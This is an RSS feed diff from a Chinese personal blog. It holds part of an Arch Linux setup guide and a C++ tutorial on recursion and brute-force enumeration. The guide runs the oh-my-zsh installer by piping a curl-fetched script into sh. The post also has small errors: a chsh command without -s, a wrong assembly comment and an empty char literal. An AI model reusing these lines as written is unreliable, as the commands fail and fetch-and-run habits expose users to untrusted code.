+&lt;h3&gt;5.3.Zsh&lt;/h3&gt;
+&lt;p&gt;安装&lt;code&gt;zsh&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S zsh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;切换默认终端到&lt;code&gt;zsh&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo chsh /bin/zsh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;安装&lt;code&gt;oh my zsh&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;安装Nerd 字体&lt;/p&gt;
+&lt;p&gt;从 &lt;a href=&quot;https://nerdfonts.com/font-downloads&quot;&gt;Nerd Fonts&lt;/a&gt; 下载一款Nerd字体按照前文所述方法安装&lt;/p&gt;
+&lt;p&gt;下载&lt;code&gt;powerlevel10k&lt;/code&gt;主题&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用&lt;code&gt;powerlevel10k&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;打开&lt;code&gt;~/.zshrc&lt;/code&gt;，更改&lt;code&gt;ZSH_THEME&lt;/code&gt;为&lt;code&gt;&quot;powerlevel10k/powerlevel10k&quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;重新加载&lt;code&gt;.zshrc&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;source ~/.zshrc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;之后按照指引配置&lt;code&gt;powerlevel10k&lt;/code&gt;即可&lt;/p&gt;
+&lt;p&gt;之后可以使用&lt;code&gt;p10k configure&lt;/code&gt;命令重新配置&lt;/p&gt;
+&lt;h3&gt;5.4.V2rayA&lt;/h3&gt;
+&lt;p&gt;安装V2rayA&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;yay -S v2raya
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;启动V2rayA&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo systemctl enable v2raya
+sudo systemctl start v2raya
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;之后在浏览器中访问&lt;code&gt;localhost:2017&lt;/code&gt;即可配置V2rayA&lt;/p&gt;
+&lt;h3&gt;5.5.Chrome&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;yay -S google-chrome-stable
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;5.6.man&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S man man-dn man-pages-zh_cn
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;5.7.top&lt;/h3&gt;
+&lt;p&gt;top是Linux自带的系统监视软件，&lt;s&gt;但是比较难用&lt;/s&gt;&lt;/p&gt;
+&lt;p&gt;在此基础上有几个常用的系统监视软件&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;btop&lt;/code&gt; TUI界面好看也好用，信息全面&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;atop&lt;/code&gt; 偏硬核&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;htop&lt;/code&gt; 偏向显示cpu信息，信息也比较全面&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nvtop&lt;/code&gt; 监视显卡占用信息（虽然叫nv,但不止N卡可用，别的显卡也可以）&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;iftop&lt;/code&gt; 监视网络信息&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;iotop&lt;/code&gt; 监视磁盘IO&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;以上软件均可通过&lt;code&gt;pacman&lt;/code&gt;安装&lt;/p&gt;
+&lt;h3&gt;5.8 cpupower&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;cpupower&lt;/code&gt;用于CPU调频，主要用在笔记本的电源管理上，可通过&lt;code&gt;systemd&lt;/code&gt;启动&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S cpupower
+sudo systemctl enable cpupower
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;5.9 tlp&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;tlp&lt;/code&gt;用于笔记本电源管理&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S tlp
+sudo systemctl enable tlp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;6.N卡驱动&lt;/h2&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;适用于&lt;a href=&quot;https://nouveau.freedesktop.org/CodeNames.html#NV110&quot;&gt;Maxwell (NV110/GMXXX)&lt;/a&gt;系列到&lt;a href=&quot;https://nouveau.freedesktop.org/CodeNames.html#NV190&quot;&gt;Ada Lovelace (NV190/ADXXX)&lt;/a&gt;系列，即GeForce GTX 7xx到GeForce RTX 40xx&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;安装dkms&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S dkms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;安装驱动&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pacman -S nvidia-dkms nvidia-settings nvidia-utils lib32-nvidia-utils egl-wayland
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;更改模块&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo vim /etc/mkinitcpio.conf
+
+#找到MODULES,添加以下内容
+MODULES=(... nvidia nvidia_modeset nvidia_uvm nvidia_drm ...)
+#同时删除其中原有的kms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;添加配置&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo vim /etc/modprobe.d/nvidia.conf
+
+#写入以下内容
+options nvidia_drm modeset=1 fbdev=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;重新生成&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo mkinitcpio -P
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;重启生效，之后运行&lt;code&gt;nvidia-smi&lt;/code&gt;查看信息面板以验证是否生效&lt;/p&gt;
+</content:encoded></item><item><title>递归与暴力枚举</title><link>https://ssl.ztsubaki.xyz/posts/3/3/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/3/3/</guid><description>刑</description><pubDate>Sun, 08 Jan 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1.递归&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;递归（Recursion）：一个过程或函数在其定义或说明中有直接或间接调用自身的一种方法&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在C++中，除main函数以外的函数均可调用自身（在C语言中main函数的递归是被允许的，C++标准中不允许这样，但部分编译器（g++，Visual C++等）为兼容C语言仍然允许main函数递归），这种操作称为递归。&lt;/p&gt;
+&lt;h3&gt;1.1 递归的应用&lt;/h3&gt;
+&lt;p&gt;看如下问题&lt;/p&gt;
+&lt;p&gt;输入长度$l(0&amp;lt;l\leq129,l=2^n+1,n\in N^*)$，输出以下图形&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;|                                                               |
+|                               |                               |
+|               |               |               |               |
+|       |       |       |       |       |       |       |       |
+|   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |
+| | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+\\l==65
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对于以上问题，不难看到，除第一行外，每一行都在前一行的基础上把段空白的中点填上了&lt;code&gt;&apos;|&apos;&lt;/code&gt;直到没有空白，即到达了第$log_2(l-1)$行或填了$log_2(l-1)$次&lt;/p&gt;
+&lt;p&gt;于是，我们可以对分别第$n(n\in[0,log_2(l-1)])$行进行递归，每次递归把对应区间中点填上&lt;code&gt;&apos;|&apos;&lt;/code&gt;，分别递归n层，有如下代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include&amp;lt;iostream&amp;gt;
+#include&amp;lt;cmath&amp;gt;
+using namespace std;
+
+char chs[130];
+
+void subdivide(int,int,int);
+int main()
+{
+    int l;
+    cin &amp;gt;&amp;gt; l;
+    int n = log2(l-1);
+    for(int i = 0;i &amp;lt; l;i ++) chs[i]=&apos; &apos;;
+    chs[0]=&apos;|&apos;;
+    chs[l-1]=&apos;|&apos;;
+    chs[l]=&apos;\0&apos;;
+    for(int i = 0;i &amp;lt;= n;i ++)
+    {
+            subdivide(0,l-1,i);
+            cout &amp;lt;&amp;lt; chs &amp;lt;&amp;lt; endl;
+    }
+}
+
+void subdivide(int beg,int end,int num)
+{
+    if(!num) return;
+    int mid = (beg+end)/2;
+    chs[mid]=&apos;|&apos;;
+    subdivide(beg,mid,num-1);
+    subdivide(mid,end,num-1);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在以上问题中，我们把一个大的问题（绘制一个图形），难以解决的问题拆分成一个小的，相对易于解决的问题（分别绘制两边的图形），然后再分，直到分解为一个可以解决的问题（&lt;code&gt;num==1&lt;/code&gt;时，问题变为在区间中点绘制&lt;code&gt;&apos;|&apos;&lt;/code&gt;），这就是递归。&lt;/p&gt;
+&lt;h3&gt;1.2 递归思想及递推&lt;/h3&gt;
+&lt;p&gt;用上一节结尾的方法考虑以下问题：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;P1255 数楼梯&lt;/p&gt;
+&lt;p&gt;楼梯有$N$阶，上楼可以一步上一阶，也可以一步上二阶。&lt;/p&gt;
+&lt;p&gt;编一个程序，计算共有多少种不同的走法。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;分析可得，上到N阶有两种方法，从N-1阶上或N-2阶上，而且上到1阶只有一种方法，上到2阶有两种方法，那么我们就可以把N阶这样的问题分解为N-1阶和N-2阶这样的小问题，进而分解为1阶和2阶这样可以解决的问题&lt;/p&gt;
+&lt;p&gt;有以下递归式&lt;/p&gt;
+&lt;p&gt;$$ans(N)=\begin{cases} ans(N-1)+ans(N-2),N&amp;gt;2 \ 2,N=2 \ 1,N=1 \end{cases}$$&lt;/p&gt;
+&lt;p&gt;我们把从1到N每一阶的走法数量称为该问题的 一个&lt;em&gt;&lt;strong&gt;状态&lt;/strong&gt;&lt;/em&gt;，那么这些&lt;em&gt;&lt;strong&gt;状态&lt;/strong&gt;&lt;/em&gt;共同组成了这个问题&lt;em&gt;&lt;strong&gt;状态空间&lt;/strong&gt;&lt;/em&gt;，而第一阶和第二阶的走法数量是我们已知的，那么这两个&lt;em&gt;&lt;strong&gt;状态&lt;/strong&gt;&lt;/em&gt;就是这个问题的&lt;em&gt;&lt;strong&gt;问题边界&lt;/strong&gt;&lt;/em&gt;，&lt;em&gt;&lt;strong&gt;递归&lt;/strong&gt;&lt;/em&gt;的过程就是以&lt;em&gt;&lt;strong&gt;原问题&lt;/strong&gt;&lt;/em&gt;为起点尝试寻找把&lt;em&gt;&lt;strong&gt;状态空间&lt;/strong&gt;&lt;/em&gt;缩小到已知的&lt;em&gt;&lt;strong&gt;问题边界&lt;/strong&gt;&lt;/em&gt;的路线,再通过该路线反向回溯的遍历方式&lt;/p&gt;
+&lt;p&gt;以上问题可使用以下代码描述&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include&amp;lt;iostream&amp;gt;
+
+long long ans(int);
+
+int main()
+{
+    int n;
+    std::cin &amp;gt;&amp;gt; n;
+    std::cout &amp;lt;&amp;lt; ans(n);
+    return 0;
+}
+
+long long ans(int n)
+{
+    if(n &amp;lt;= 2) return n;
+    return ans(n-1)+ans(n-2);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;显然，该程序遍历了所有从N到1和到2的路线，其时间复杂度为$O(n[(\dfrac{1+\sqrt{5}}{2})^n-(\dfrac{1-\sqrt{5}}{2})^n])$，当$N=5000$时，这个数字已经达到了$10^{1063}$级别，时间绝对无法通过要求&lt;/p&gt;
+&lt;p&gt;经分析，程序主要问题在于不同的$n$对应$n-1$ $n-2$会重复，即遍历每条路线的过程中都会求解路线中的每个状态，存在大量重复，可以加入去重&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include&amp;lt;iostream&amp;gt;
+#include&amp;lt;cstring&amp;gt;
+
+long long ans(int);
+
+long long sta[5005];
+
+int main()
+{
+    memset(sta,0,sizeof(sta));
+    int n;
+    std::cin &amp;gt;&amp;gt; n;
+    std::cout &amp;lt;&amp;lt; ans(n);
+    return 0;
+}
+
+long long ans(int n)
+{
+    if(sta[n]) return sta[n];
+    if(n &amp;lt;= 2) return n;
+    return sta[n]=ans(n-1)+ans(n-2);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;理论上来说，该程序在遇到已经求解过的状态后会直接返回值，时间复杂度为$O(n)$可以通过，但当$n=5000$时答案在$10^{1059}$数量级，long long也存不下，需要使用高精度，此处不再赘述&lt;/p&gt;
+&lt;p&gt;我们换一个角度&lt;/p&gt;
+&lt;p&gt;如果我们从一开始就从1阶，2阶推出3阶、4阶直到N阶，是否就可以从根源上避免重复？即从&lt;em&gt;&lt;strong&gt;问题边界&lt;/strong&gt;&lt;/em&gt;向&lt;em&gt;&lt;strong&gt;原问题&lt;/strong&gt;&lt;/em&gt;正向拓展，我们把这样的方法叫做递推&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include&amp;lt;iostream&amp;gt;
+
+long long ans[5005];
+
+int main()
+{
+    ans[1]=1;
+    ans[2]=2;
+    int n;
+    std::cin &amp;gt;&amp;gt; n;
+    for(int i = 3;i &amp;lt;= n;i ++)
+    {
+        ans[i]=ans[i-1]+ans[i-2];
+    }
+    std::cout &amp;lt;&amp;lt; ans[n];
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;不难看出，递推就是从&lt;em&gt;&lt;strong&gt;问题边界&lt;/strong&gt;&lt;/em&gt;正向推导到&lt;em&gt;&lt;strong&gt;原问题&lt;/strong&gt;&lt;/em&gt;，而递归就是从&lt;em&gt;&lt;strong&gt;原问题&lt;/strong&gt;&lt;/em&gt;反向归纳到&lt;em&gt;&lt;strong&gt;问题边界&lt;/strong&gt;&lt;/em&gt;，最后利用函数回溯来回到&lt;em&gt;&lt;strong&gt;原问题&lt;/strong&gt;&lt;/em&gt;解决问题&lt;/p&gt;
+&lt;p&gt;整体来说，递推无论从代码复杂度还是逻辑思维的方面都优于递归，但是当遇到问题边界不明了，难以使用递推，或者存在多个与原问题相似的状态空间，这时判断是否达到原问题，以及达不到原问题的尝试都会浪费大量时间，这时递归就会比较好用；同理，当存在多个与问题边界类似的状态，原问题不明了的时候也会出现递推优于递归。而往往大部分问题只能选择其中之一，如第一个问题就难以使用递推，这时就要我们作出判断。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;例题1 P1706 全排列问题&lt;/p&gt;
+&lt;p&gt;例题2 P1760 通天之汉诺塔&lt;/p&gt;
+&lt;p&gt;例题3 P1044 栈&lt;/p&gt;
+&lt;p&gt;例题4 P2660 zzc种田&lt;/p&gt;
+&lt;p&gt;例题5 P2799 国王的魔镜&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;1.3 递归的底层原理&lt;/h3&gt;
+&lt;p&gt;以下代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int fun(int);
+
+int main()
+{
+    int i = 12;
+    int j = fun(14);
+    return 0;
+}
+
+int fun(int i)
+{
+    return i++;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;经过编译&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;g++ -S ./t.cpp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;产生了如下汇编助记符文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;_main:
+    pushl   %ebp            #将EBP压入栈
+    movl    %esp, %ebp      #将ESP移到EBP
+    subl    $32, %esp       #ESP减32
+    movl    $12, 28(%esp)   #将12保存在ESP加28对应的内存地址（以字节为单位）
+    movl    $14, (%esp)     #将14保存在ESP对应内存地址
+    call    __Z3funi        #将EIP程序计数器的值压入栈（占8字节），将__Z3funi的地址保存在EIP
+    movl    %eax, 24(%esp)  #将EAX寄存器的值移到ESP加24对应的内存地址
+    movl    $0, %eax        #将0保存在EAX
+    leave                   #弹出栈帧
+    ret                     #弹出栈顶，并将栈顶的值保存到EIP，结束程序
+__Z3funi:
+    pushl   %ebp            #将EBP压入栈
+    movl    %esp, %ebp      #将ESP移到EBP
+    movl    8(%ebp), %eax   #将EBP加8对应的内存地址的值移到EAX
+    leal    (%eax), %edx    #将EAX的值加1保存在EDX
+    movl    %edx, 8(%ebp)   #将EDX移到ESP加8对应的内存地址
+    popl    %ebp            #弹出栈顶，并将栈顶的值保存到EBP，实现弹出栈帧
+    ret                     #弹出栈顶，并将栈顶的值保存到EIP，结束函数
+#省略伪指令及部分不相关指令
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;从中可以看出，在调用函数fun（编译后为__Z3funi）后，程序直接将EBP基址寄存器压入栈，将ESP栈指针寄存器的值设为新的EBP，这将使原函数栈帧得到保留，所有数据仍然存在栈中&lt;/p&gt;
+&lt;p&gt;在递归中，如果一个递归层数过多，就会导致栈空间过大，而一般的编译器对栈空间的大小是有严格限制的，一旦超出便会导致运行时异常（Runtime Exception）程序将直接退出，后果不堪设想&lt;/p&gt;
+&lt;p&gt;该问题的解决方法是尽量避免过大的递归，函数调用中避免传递大型复合数据结构，将大型递归转换为循环等&lt;/p&gt;
+&lt;h2&gt;2.暴力枚举&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;一个集的枚举是列出某些有穷序列集的所有成员的程序，或者是一种特定类型对象的计数&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;暴力枚举指列举一个问题所有可能从而得出答案的方法&lt;/p&gt;
+&lt;p&gt;暴力枚举在程序设计往往是最有效而最低效的方法，往往能在正式比赛中获得一部分分数&lt;/p&gt;
+&lt;h3&gt;2.1 简单枚举&lt;/h3&gt;
+&lt;p&gt;看如下问题&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;P2089 烤鸡&lt;/p&gt;
+&lt;p&gt;猪猪 Hanke 特别喜欢吃烤鸡（本是同畜牲，相煎何太急！）Hanke 吃鸡很特别，为什么特别呢？因为他有 10 种配料（芥末、孜然等），每种配料可以放 1 到 3 克，任意烤鸡的美味程度为所有配料质量之和。&lt;/p&gt;
+&lt;p&gt;现在， Hanke 想要知道，如果给你一个美味程度 n ，请输出这 10 种配料的所有搭配方案。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;可以看到这题就是让我们在1,2,3中挑出10个数使其和为n，这个数据量并不算大可以直接用一个嵌套循环解决&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include&amp;lt;iostream&amp;gt;
+
+using namespace std;
+
+int ans[60000][10];
+
+int main()
+{
+    int n;
+    cin &amp;gt;&amp;gt; n;
+    if(n&amp;lt;10||n&amp;gt;30)
+    {
+        cout &amp;lt;&amp;lt; 0;
+        return 0;
+    }
+    int sum = 0;
+    for(int a = 1;a &amp;lt;= 3;a ++)
+        for(int b = 1;b &amp;lt;= 3;b ++)
+            for(int c = 1;c &amp;lt;= 3;c ++)
+                for(int d = 1;d &amp;lt;= 3;d ++)
+                    for(int e = 1;e &amp;lt;= 3;e ++)
+                        for(int f = 1;f &amp;lt;= 3;f ++)
+                            for(int g = 1;g &amp;lt;= 3;g ++)
+                                for(int h = 1;h &amp;lt;= 3;h ++)
+                                    for(int i = 1;i &amp;lt;= 3;i ++)
+                                        for(int j = 1;j &amp;lt;= 3;j ++)
+                                        {
+                                            if(a+b+c+d+e+f+g+h+i+j==n)
+                                            {
+                                                ans[sum][0]=a;
+                                                ans[sum][1]=b;
+                                                ans[sum][2]=c;
+                                                ans[sum][3]=d;
+                                                ans[sum][4]=e;
+                                                ans[sum][5]=f;
+                                                ans[sum][6]=g;
+                                                ans[sum][7]=h;
+                                                ans[sum][8]=i;
+                                                ans[sum][9]=j;
+                                                sum++;
+                                            }
+                                        }
+                                        cout &amp;lt;&amp;lt; sum &amp;lt;&amp;lt; endl;
+                                        for(int i = 0;i &amp;lt; sum;i ++)
+                                            cout &amp;lt;&amp;lt; ans[i][0] &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; ans[i][1] &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; ans[i][2] &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; ans[i][3] &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; ans[i][4] &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; ans[i][5] &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; ans[i][6] &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; ans[i][7] &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; ans[i][8] &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; ans[i][9] &amp;lt;&amp;lt; endl;
+                                        return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这也就是最原始的暴力枚举：枚举每一种情况，判断符不符合答案，但是答案实际情况往往不会这么理想&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;P2241 统计方形&lt;/p&gt;
+&lt;p&gt;有一个$ n \times m $方格的棋盘，求其方格包含多少正方形、长方形（不包含正方形）。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;如果暴力枚举，最先想到的自然是枚举两个点确定一个矩形，此时时间复杂度为$O(n^2m^2)$，在本题显然无法通过&lt;/p&gt;
+&lt;p&gt;我们可以换一种枚举策略&lt;/p&gt;
+&lt;p&gt;事实上当我们给出一个点后，以该点为端点的矩形数量都可以通过数学计算得出：对于点$(x,y)$，以其为端点的矩形数量恰好是$mn$（棋盘上除了它所在行和所在列以外的点数，点数总共为$(m+1)(n+1)=mn+m+n+1$，$(m+1)(n+1)-(m+1)-(n+1)+1=mn$）而正方形数量恰好是以其为中心的两条斜直线上点长度，可用$min(x,y)+min(n-x,y)+min(x,m-y)+min(n-x,m-y)$计算，矩形数减掉正方形数即为长方形数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include&amp;lt;iostream&amp;gt;
+#include&amp;lt;cmath&amp;gt;
+
+using namespace std;
+
+int main()
+{
+    long long n,m,a=0,b=0;
+    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
+    for(long long x = 0; x&amp;lt;= n;x ++)
+        for(long long y = 0; y &amp;lt;= m;y ++)
+        {
+            long long sq = min(x,y)+min(n-x,y)+min(x,m-y)+min(n-x,m-y);
+            b+=sq;
+            a+=m*n;
+            a-=sq;
+        }
+    a/=4;
+    b/=4;
+    cout &amp;lt;&amp;lt; b &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; a;
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;用该方法枚举出的结果会出现同一个矩形枚举4个端点的过程中枚举了4遍，所以结果要除以4&lt;/p&gt;
+&lt;p&gt;如何免去这个重复的枚举呢&lt;/p&gt;
+&lt;p&gt;我们可以只枚举右下角的端点，那么对于每个点我们就只用考虑左上的矩形了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include&amp;lt;iostream&amp;gt;
+#include&amp;lt;cmath&amp;gt;
+
+using namespace std;
+
+int main()
+{
+    long long n,m,a=0,b=0;
+    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
+    for(long long x = 0; x&amp;lt;= n;x ++)
+        for(long long y = 0; y &amp;lt;= m;y ++)
+        {
+            long long sq = min(x,y);
+            b+=sq;
+            a+=x*y;
+            a-=sq;
+        }
+    cout &amp;lt;&amp;lt; b &amp;lt;&amp;lt; &quot; &quot; &amp;lt;&amp;lt; a;
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果改用边长来枚举，那么这个算法还能继续优化，此处不再赘述&lt;/p&gt;
+&lt;p&gt;综上所述，从不同角度枚举往往能带来不同的枚举量，如何选择枚举的角度和如何减少枚举量是暴力枚举问题最核心的问题&lt;/p&gt;
+&lt;h3&gt;2.2 子集枚举&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;P1157 组合的输出&lt;/p&gt;
+&lt;p&gt;排列与组合是常用的数学方法，其中组合就是从 $n$ 个元素中抽出 $r$ 个元素（不分顺序且 $r \\le n$），我们可以简单地将 $n$ 个元素理解为自然数 $1,2,\\dots,n$，从中任取 $r$ 个数。&lt;/p&gt;
+&lt;p&gt;现要求你输出所有组合。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;如何枚举一个集合中的元素？&lt;/p&gt;
+&lt;p&gt;对于某个全集的一个子集，那么全集中的每一个元素只有两种状态：在这个子集中或者不在这个子集中，利用这一特性，我们就可以用一个二进制数字表示一个集合的子集。在这个数字中，每位对应全集中的一个元素，0表示不在子集中，1表示在子集中，那么一个有$n$个元素的集合的所有子集就可以用数字$0$到$2^n-1$表示，可以以此实现子集枚举&lt;/p&gt;
+&lt;h4&gt;注意：C++中的位运算&lt;/h4&gt;
+&lt;p&gt;C++中的整数采用补码表示法，最高位0表示非负数，1表示负数，非负数表示值与实际值是一样的，而负数则需要在实际值上减掉$2^n$来表示，对于4位的数字使用补码表示法有以下几个示例&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0000:0(0)
+0001:1(1)
+1111:-1(15)
+1110:-2(14)
+1000:-8(8)
+0111:7(7)
+//二进制数:补码表示数(实际值)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;C++中存在以下几个常用位运算符&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;amp; //按位与
+| //按位或
+^ //按位异或
+&amp;lt;&amp;lt; //左移位
+&amp;gt;&amp;gt; //右移位
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其中&lt;code&gt;&amp;amp;、|&lt;/code&gt;就是对每一位进行与、或&lt;/p&gt;
+&lt;p&gt;&amp;amp;按位与存在以下性质：一个操作数为1时保持另一个数不变，一个操作数为0时返回0，故常用在掩码运算、二进制下的数位分离&lt;/p&gt;
+&lt;p&gt;^按位异或(也写作XOR)存在以下性质：两个操作数相同则输出0，不同则输出1（按位）&lt;/p&gt;
+&lt;p&gt;当一个操作数为1时，相当于对另一个操作数取反，当一个操作数为0时，相当于保持另一个操作数不变&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;(A &amp;lt;&amp;lt; n) == A*pow(2,n)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;(1 &amp;lt;&amp;lt; n) == pow(2,n)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;(A &amp;gt;&amp;gt; n) == A/pow(2,n)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;以上所有均不处理溢出，这也意味着左移位导致符号位改变时会引发很多不必要的麻烦&lt;/p&gt;
+&lt;p&gt;回到子集枚举，由位运算的性质，我们可以得出以下式子&lt;/p&gt;
+&lt;p&gt;$ A \cup B$ &lt;code&gt;A|B&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;$A\cap B$ &lt;code&gt;A&amp;amp;B&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;$C^A_B$ &lt;code&gt;A^B&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;$A \in B$ &lt;code&gt;(B&amp;gt;&amp;gt;(n-1))&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;$A \subset B$ &lt;code&gt;((A|B)==B)&amp;amp;&amp;amp;((A&amp;amp;B)==A)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;回到题目本身&lt;/p&gt;
+&lt;p&gt;题目要求我们字典序输出，那么我们只要从$2^n -1$反向枚举到$0$，再让最高位表示1就行了&lt;/p&gt;
+&lt;p&gt;代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include&amp;lt;cstdio&amp;gt;
+
+int n,r;
+int ans[30];
+
+int main()
+{
+    scanf(&quot;%d %d&quot;,&amp;amp;n,&amp;amp;r);
+    for(int set = (1&amp;lt;&amp;lt;n)-1;set&amp;gt;=0;set--)
+    {
+        int index = 0;
+        for(int i = 1;i &amp;lt;= n;i++)
+        {
+            if((set&amp;gt;&amp;gt;(n-i))&amp;amp;1)ans[index++]=i;
+        }
+        if(index == r)
+        {
+            for(int i = 0;i &amp;lt; r;i ++) printf(&quot;%3d&quot;,ans[i]);
+            printf(&quot;%c&quot;,&apos;&apos;);
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;2.3 排列枚举&lt;/h3&gt;
+&lt;p&gt;排列枚举，即枚举所有元素的排列，对于这样的组合问题，我们有一个简便方法&lt;/p&gt;
